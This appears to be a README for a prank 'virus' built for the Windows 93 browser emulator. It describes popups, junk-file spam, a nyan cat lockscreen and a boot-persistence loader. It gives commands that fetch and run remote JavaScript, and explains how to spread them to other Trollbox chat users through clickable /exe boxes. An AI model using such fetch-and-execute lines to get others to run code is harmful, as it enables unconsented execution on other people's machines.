# Memz-virus-v6

IF ANY OF THIS CODE IS USED OR HAS BEEN PUBLISHED BY SOMEONE ELSE YOU --MUST-- CREDIT ME

Hello there
This virus is inspired by the original MEMZ virus.
It is meant to run in the windows 93 emulator and was made in the emulator at http://windows93.net/

I would say this would be the best virus you can play with in win 93.



# What does it do?

The virus will make popups on your screen to annoy you including 2 other popups that will 
1: Load a memory virus. (spams you with junk files)

2: A fake reboot button that will put a nyan cat on your screen and play nyan cat music.
^^^(this will also not allow you to do anything, there will only be a nyan cat on your screen.)

The virus will open win 93 apps incuding Hydra.exe, and will also infect your boot with a js file that loads itself whenever you boot up. 
-->code($loader.script("https://raw.githack.com/mhmmkm/Memz-virus-v6/main/Code.js"))


There is another feature which defines that this is a virus. You can make others get it on their emulator using the win 93 app, Trolbox.
In trolbox u need to type in the command  /exe js https://raw.githack.com/mhmmkm/Memz-virus-v6/main/Code.js

The /exe command in trolbox is the executing command that will allow others to execute whatever you put after the exe.

This will make a /exe box next to your code which allows others to click that and execute that line of code.
It's the same thing in terminal. If you type js https://raw.githack.com/mhmmkm/Memz-virus-v6/main/Code.js
it will load the raw code.

I used https://raw.githack.com/ to make the code in this git be in a raw form.

I will be using this branch to publish any js code for the win 93 emulator.
